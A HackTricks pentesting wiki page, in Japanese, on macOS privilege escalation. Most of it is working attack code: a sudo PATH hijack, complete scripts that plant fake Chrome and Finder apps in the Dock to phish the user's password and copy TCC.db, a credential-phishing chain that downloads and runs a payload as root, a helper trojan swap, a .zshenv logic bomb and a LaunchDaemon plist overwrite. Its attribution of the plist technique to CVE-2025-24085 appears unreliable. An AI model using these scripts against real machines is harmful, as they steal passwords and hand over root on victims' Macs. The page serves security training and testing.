# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探してここに来た場合は、以下を参照してください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix に影響する privilege escalation のトリックのほとんどは、MacOS** マシンにも影響することに注意してください。そのため、以下を参照してください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

元の [Sudo Hijacking technique は Linux Privilege Escalation の記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。

ただし、macOS はユーザーが **`sudo`** を実行するとき、ユーザーの **`PATH`** を**維持します**。つまり、この攻撃を実現する別の方法は、被害者が **sudo を実行する際に**実行する別の **binary** を**hijack する**ことです:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ユーザーが terminal を使用する場合、**Homebrew がインストールされている可能性が非常に高い**ことに注意してください。そのため、**`/opt/homebrew/bin`** 内のバイナリを hijack することが可能です。

### Dock Impersonation

**social engineering** を利用すれば、たとえば Dock 内で **Google Chrome** になりすまし、実際には自分のスクリプトを実行させることができます。

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案：

- Dock に Chrome があるか確認し、存在する場合はそのエントリを**削除**し、Dock の配列内で**同じ位置**に**偽の** **Chrome エントリ**を**追加**します。

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案：

- **Finder は Dock から削除できない**ため、Dock に追加する場合は、偽の Finder を本物の Finder のすぐ隣に配置できます。そのためには、**Dock 配列の先頭に偽の Finder エントリを追加する**必要があります。
- 別の方法として、Dock に配置せずにそのまま開くこともできます。「Finder が Finder の制御を要求しています」という表示は、それほど不自然ではありません。
- ひどいダイアログを表示してパスワードを尋ねることなく**root に escalate する**別の方法は、特権操作を実行するために Finder にパスワードを実際に要求させることです。
- Finder に新しい **`sudo` ファイルを `/etc/pam.d`** にコピーするよう要求する（パスワードを求めるプロンプトには「Finder が sudo をコピーしようとしています」と表示されます）
- 新しい **Authorization Plugin** をコピーするよう Finder に要求する（ファイル名を制御できるため、パスワードを求めるプロンプトには「Finder が Finder.bundle をコピーしようとしています」と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malwareは、ユーザーの操作を悪用して**sudoが使用可能なパスワードを取得**し、プログラムから再利用することがよくあります。一般的な流れ:

1. `whoami`でログイン中のユーザーを特定する。
2. `dscl . -authonly "$user" "$pw"`が成功を返すまで、**パスワードプロンプトをループ**する。
3. credentialを（例: `/tmp/.pass`に）cacheし、`sudo -S`（stdin経由でパスワードを渡す）でprivileged actionsを実行する。

最小構成のExample chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗まれた password は、その後 **`xattr -c` で Gatekeeper quarantine を解除し**、LaunchDaemons やその他の privileged files をコピーして、追加の stages を非対話的に実行するために再利用できます。<sup>[[1]](#references)</sup>

## 新しい macOS-specific vectors (2023–2025)

### 非推奨の `AuthorizationExecuteWithPrivileges` は依然として利用可能

`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia でも依然として動作します**。多くの commercial updaters は、信頼できない path を指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable であれば、trojan を仕込み、正規の prompt に便乗できます：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
**masquerading tricks above**と組み合わせて、信憑性のあるパスワードダイアログを表示します。


### Privileged helper / XPC triage

現代の多くのサードパーティ製macOS privescは、同じパターンに従います。**root LaunchDaemon**が**`/Library/PrivilegedHelperTools`**から**Mach/XPC service**を公開し、その後、helperが**clientを検証しない**、検証が**遅すぎる**（PID race）、または**user-controlled path/script**を受け取る**root method**を公開します。これは、VPN client、game launcher、updaterで近年発生した多くのhelper bugの背後にあるbug classです。<sup>[[2]](#references)</sup>

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特に、以下のような helper に注意してください。

- ジョブが `launchd` に読み込まれたまま残るため、**uninstall 後も**リクエストを受け付け続ける
- **`/Applications/...`** または non-root user が書き込み可能なその他のパスから、scripts を実行したり configuration を読み込んだりする
- **PID-based** または **bundle-id-only** の peer validation に依存しており、raceable である可能性がある

helper authorization bugs の詳細については、[this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、**`Installer.app`** / **`PackageKit.framework`** を介した user-initiated installs では、**PKG scripts を current user's environment 内で root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、attacker の **`~/.zshenv`** を読み込み、victim がその package をインストールした際に、それを **root** として実行できました。<sup>[[3]](#references)</sup>

これは **logic bomb** として特に興味深いものです。user's account への foothold と、書き込み可能な shell startup file があればよく、その後は user によって脆弱な **zsh-based** installer が実行されるのを待つだけです。これは通常、**MDM/Munki** deployments には適用されません。これらは root user's environment 内で実行されるためです。<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
より深く installer 固有の abuse について調べたい場合は、[このページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist またはその `ProgramArguments` の target が **user-writable** である場合、それを置き換えた後に launchd に reload を強制することで privilege escalation が可能です：
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
これは、書き込み可能な plist を悪用して attacker code を root として実行する、**CVE-2025-24085** で公開された exploit pattern を反映しています。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` の **race** により、local attacker は複数の thread で `setgid()`/`getgid()` の loop を実行し、torn `memcpy` が発生するまで競合させることで、read-only credential pointer (`proc_ro.p_ucred`) を破壊できます。破壊に成功すると、**uid 0** と kernel memory access が得られます。最小限の PoC 構造は次のとおりです。
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming と組み合わせて、pointer が再読み込みされる場所に制御可能なデータを配置します。脆弱な build では、これは SIP bypass を必要としない、信頼性の高い **local kernel privesc** です。<sup>[[4]](#references)</sup>

### Migration Assistant による SIP bypass（"Migraine", CVE-2023-32369）

すでに root を取得していても、SIP は system location への書き込みをブロックします。**Migraine** bug は、Migration Assistant entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を spawn し、保護された path（例：`/System/Library/LaunchDaemons`）を上書きします。<sup>[[5]](#references)</sup> chain は次のとおりです：

1. live system 上で root を取得する。
2. crafted state を使用して `systemmigrationd` を trigger し、attacker-controlled binary を実行させる。
3. 継承した entitlement を使用して SIP-protected file に patch を適用し、reboot 後も persistence させる。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

複数の Apple daemon は XPC 経由で **NSPredicate** object を受け入れ、`expressionType` field のみを validate しています。この field は attacker-controlled です。任意の selector を evaluate する predicate を craft することで、**root/system XPC service**（例：`coreduetd`、`contextstored`）で **code execution** を達成できます。initial app sandbox escape と組み合わせると、**user prompt なしで privilege escalation** が可能になります。predicate を deserialize する一方で、robust な visitor が存在しない XPC endpoint を探してください。<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation

**Any user**（unprivileged user であっても）は、`-o noowners` を指定して Time Machine snapshot を create および mount し、その snapshot に含まれる **ALL the files** に access できます。これにより、live volume 上の ownership check を bypass できます。必要な privilege は、使用する application（`Terminal` など）に **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）が付与されていることだけです。

command と full explanation は TCC bypasses page にあります：

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

これは privilege escalation に役立つ可能性があります：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
